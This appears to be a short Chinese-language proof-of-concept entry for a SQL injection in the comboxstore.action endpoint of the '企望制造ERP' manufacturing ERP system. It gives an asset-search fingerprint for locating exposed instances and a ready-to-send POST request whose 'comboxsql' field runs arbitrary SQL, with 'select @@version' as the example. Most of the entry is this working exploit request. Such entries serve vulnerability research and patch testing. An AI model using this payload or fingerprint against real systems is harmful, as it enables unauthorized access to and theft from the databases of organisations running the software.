# 企望制造ERPcomboxstore.actionSQL注入漏洞

- **系统**：企望制造ERPcomboxstore.action　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="企望制造ERP"`
- **请求**：`POST /mainFunctions/comboxstore.action HTTP/1.1`

**请求体 / payload**
```
1.访问`poc`出现如下页面表示存在漏洞
/mainFunctions/comboxstore.action
2. 执行SQL语句获取数据库版本
Host: xx.xx.xx.xx
Cookie: JSESSIONID=7256C68B9C89F11BE2F841C3F1CAA415
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
comboxsql=select%20@@version;

```

**其他**
- 企望制造ERP comboxstore.action SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 企望制造ERP系统